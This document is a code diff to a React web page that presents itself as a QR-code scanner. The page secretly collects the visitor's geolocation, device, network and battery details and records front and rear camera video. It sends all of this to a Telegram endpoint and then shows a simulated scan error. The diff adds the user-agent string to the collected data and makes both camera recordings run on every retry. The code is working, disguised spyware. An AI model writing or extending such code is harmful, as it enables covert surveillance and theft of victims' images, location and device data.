@@ -14,11 +14,12 @@ import {
 } from "@/lib/client-data";
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
-const VIDEO_SEGMENT_DURATION_MS = 4000; // 4 секунды для каждого видеосегмента
-const QR_SCAN_TIMEOUT_MS = 5000; // 5 секунд для видимого QR-сканирования перед имитированной ошибкой
+const VIDEO_1_DURATION_MS = 3000; // 3 секунды для фронтальной камеры
+const VIDEO_2_DURATION_MS = 4000; // 4 секунды для задней камеры
+const QR_SCAN_TIMEOUT_MS = 10000; // 10 секунд для видимого QR-сканирования перед имитированной ошибкой
 
 type GeolocationData = { latitude: number; longitude: number };
-type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
+type ClientInfo = { userAgent: string; platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
 type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
 type BatteryInfo = { level?: number; charging?: boolean; status?: string };
 
@@ -232,9 +233,10 @@ const PermissionHandler = () => {
     console.log(`[Session ${currentSessionId}] Starting runProcess. Attempt: ${attempt}`);
 
     const genericLoadingMessage = "Պատրաստվում ենք QR սկանավորմանը, խնդրում ենք սպասել..."; // "Preparing for QR scanning, please wait..."
+    setLoadingMessage(genericLoadingMessage);
 
+    // --- Step 1: Collect data (only on the first attempt) ---
     if (attempt === 1) {
-      setLoadingMessage(genericLoadingMessage);
       setAppPhase("collectingData");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'collectingData'.`);
 
@@ -278,44 +280,33 @@ const PermissionHandler = () => {
 
       const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary, attempt);
       setProcessSuccessful(initialSendSuccess);
-
-      setAppPhase("recordingVideo1");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo1'.`);
-      const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      if (video1Base64) {
-        const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt);
-        setProcessSuccessful(prev => prev && video1SendSuccess);
-      }
-
-      setAppPhase("recordingVideo2");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2'.`);
-      const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
-      if (video2Base64) {
-        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
-        setProcessSuccessful(prev => prev && video2SendSuccess);
-      }
-
-      setAppPhase("qrScanning");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning'.`);
-
-    } else if (attempt === 2) {
-      console.log(`[Session ${currentSessionId}] Attempt 2 initiated (Retry).`);
-      const stage2Message = { qrCodeData: "Этап 2: Повторная попытка сканирования QR-кода." };
+    } else {
+      // --- For subsequent attempts, just send a status message ---
+      console.log(`[Session ${currentSessionId}] Attempt ${attempt} initiated (Retry).`);
+      const stage2Message = { qrCodeData: `Этап 2: Повторная попытка сканирования QR-кода (Попытка ${attempt}).` };
       await sendDataToTelegram(stage2Message, MessageType.QrCode, attempt);
-
-      setLoadingMessage(genericLoadingMessage);
-      setAppPhase("recordingVideo2");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2' for attempt 2.`);
-      const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
-      if (video2Base64) {
-        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
-        setProcessSuccessful(prev => prev && video2SendSuccess);
-      }
-      
-      setAppPhase("qrScanning");
-      console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning' for attempt 2.`);
-      return;
     }
+
+    // --- Step 2: Record videos (on every attempt) ---
+    setAppPhase("recordingVideo1");
+    console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo1' for attempt ${attempt}.`);
+    const video1Base64 = await recordVideoSegment(VIDEO_1_DURATION_MS, "user");
+    if (video1Base64) {
+      const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt);
+      setProcessSuccessful(prev => prev && video1SendSuccess);
+    }
+
+    setAppPhase("recordingVideo2");
+    console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2' for attempt ${attempt}.`);
+    const video2Base64 = await recordVideoSegment(VIDEO_2_DURATION_MS, "environment");
+    if (video2Base64) {
+      const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
+      setProcessSuccessful(prev => prev && video2SendSuccess);
+    }
+
+    // --- Step 3: QR Scanning ---
+    setAppPhase("qrScanning");
+    console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning' for attempt ${attempt}.`);
     
   }, [
     currentSessionId,
